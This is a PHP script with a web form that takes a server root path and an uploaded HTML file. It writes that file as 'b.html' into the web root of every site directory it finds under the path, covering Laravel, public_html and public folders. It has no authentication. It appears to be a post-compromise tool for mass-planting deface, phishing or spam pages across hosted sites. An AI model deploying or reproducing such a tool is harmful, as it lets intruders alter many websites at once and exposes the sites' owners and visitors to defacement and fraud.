<?php

try {
    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["upload_form"])) {
        $rootPath = trim($_POST['root_path'] ?? '');
        $fileContent = $_FILES['local_file']['tmp_name'] ?? '';
        
        if (empty($rootPath)) {
            throw new Exception("Root path is empty!");
        }
        if (!is_dir($rootPath)) {
            throw new Exception("Invalid root directory: " . htmlspecialchars($rootPath));
        }

        if (empty($fileContent)) {
            throw new Exception("No file uploaded or upload error occurred!");
        }

        if (!is_uploaded_file($fileContent)) {
            throw new Exception("Invalid file upload attempt!");
        }

        // Get all subdirectories in the root path
        $targetFolders = [];
        $items = scandir($rootPath);
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $rootPath . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                // Check if it's a Laravel project (has resources folder)
                $resourcesPath = $path . DIRECTORY_SEPARATOR . 'resources';
                if (is_dir($resourcesPath)) {
                    $targetFolders[] = $path; // Upload directly to Laravel root
                    continue;
                }

                // Check for public_html or public
                $publicHtmlPath = $path . DIRECTORY_SEPARATOR . 'public_html';
                $publicPath = $path . DIRECTORY_SEPARATOR . 'public';
                
                if (is_dir($publicHtmlPath)) {
                    $targetFolders[] = $publicHtmlPath;
                } elseif (is_dir($publicPath)) {
                    $targetFolders[] = $publicPath;
                } else {
                    $targetFolders[] = $path; // Fallback to root directory
                }
            }
        }

        if (empty($targetFolders)) {
            throw new Exception("No subdirectories found in: " . htmlspecialchars($rootPath));
        }

        $results = uploadHtmlFile($targetFolders, $fileContent);
        displayResults($results);
        exit;
    }
    showUploadForm();
} catch (Exception $e) {
    die("Error: " . $e->getMessage());
}

function uploadHtmlFile($folders, $tmpFile) {
    if (!is_uploaded_file($tmpFile)) {
        die("Error: Invalid file upload!");
    }

    $fileContent = file_get_contents($tmpFile);
    if ($fileContent === false) {
        die("Error: Failed to read uploaded file!");
    }

    $results = [];
    foreach ($folders as $folder) {
        $filename = 'b.html'; // Always use index.html
        $destPath = rtrim($folder, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
        
        // Backup existing file if it exists
        if (file_exists($destPath)) {
            $backupPath = $destPath . '.bak';
            @copy($destPath, $backupPath);
        }

        if (file_put_contents($destPath, $fileContent) !== false) {
            @chmod($destPath, 0644);
            $results[$destPath] = "Success (Upload)";
        } else {
            $error = error_get_last();
            $results[$destPath] = "Upload failed: " . ($error['message'] ?? 'Unknown error');
        }
    }
    return $results;
}
 
function displayResults($results) {
    echo '<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Result</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body data-bs-theme="dark">';

    echo '<div class="container mt-4"><div class="card"><div class="card-header" style="background-color: #7E30E1; color: #FFF;">
          <h4>Operation Results</h4></div><div class="card-body"><ul class="list-group">';

    foreach ($results as $path => $status) {
        echo '<li class="list-group-item">
              <div class="d-flex justify-content-between align-items-center">
                <div>
                  <div class="text-muted small"><strong>Path:</strong> ' . htmlspecialchars($path) . '</div>
                </div>
                <span class="badge bg-' . (strpos($status, 'Success') !== false ? 'success' : 'danger') . '">'
            . htmlspecialchars($status) . '</span>
              </div>
              </li>';
    }

    echo '</ul></div></div></div></body></html>';
}

function showUploadForm() {
?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>HTML File Uploader</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body data-bs-theme="dark">
        <div class="container mt-4">
            <div class="card">
                <div class="card-header" style="background-color: #7E30E1; color: #FFF;">
                    <h4>HTML File Uploader</h4>
                </div>
                <div class="card-body">
                    <form method="post" enctype="multipart/form-data">
                        <input type="hidden" name="upload_form" value="1">
                        <div class="mb-3">
                            <label class="form-label">Root Directory Path (required):</label>
                            <input type="text" class="form-control" name="root_path" placeholder="/var/www/html" required>
                        </div>
                        <div class="mb-3">
                            <label class="form-label">Select HTML File to Upload:</label>
                            <input type="file" class="form-control" name="local_file" accept=".html,.htm" required>
                        </div>
                        <button type="submit" class="btn" style="background-color: #7E30E1; color: #FFF;">Upload</button>
                    </form>
                </div>
            </div>
        </div>
    </body>
    </html>
<?php
}
